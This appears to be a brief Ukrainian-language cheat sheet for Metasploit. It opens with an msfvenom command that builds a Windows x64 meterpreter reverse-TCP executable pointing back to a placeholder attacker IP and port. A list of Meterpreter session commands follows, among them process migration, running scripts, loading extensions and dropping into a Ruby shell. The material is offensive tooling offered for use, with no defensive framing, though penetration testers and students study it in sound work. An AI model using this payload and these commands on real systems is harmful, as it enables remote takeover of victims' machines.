## Створення payload:

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -a x64 -o /home/kali/payload.exe

## Основні команди Meterpreter:

**?** — меню допомоги  
**background** — переносить поточний сеанс в фоновий режим.  
**bgkill** — завершує фоновий скрипт meterpreter.  
**bglist** — відображає список всіх запущених фонових скриптів.  
**bgrun** — запускає скрипт як фоновий потік.  
**channel**  — відображає активні канали.  
**close** — закриває канал.  
**exit** — завершує севнс роботи з meterpreter.  
**help** — меню довідки.  
**interact** — взаємодіє з каналом.  
**irb** — перейти в режим сценарію Ruby.  
**migrate** — переносить активний процес на указаний PID.  
**quit** — завершує сеанс meterpreter.  
**read** — читає дані з каналу.  
**run** — виконує створений після нього скрипт meterpreter.  
**use** — завантажує розширення meterpreter.  
**write** — записує дані в канал.  

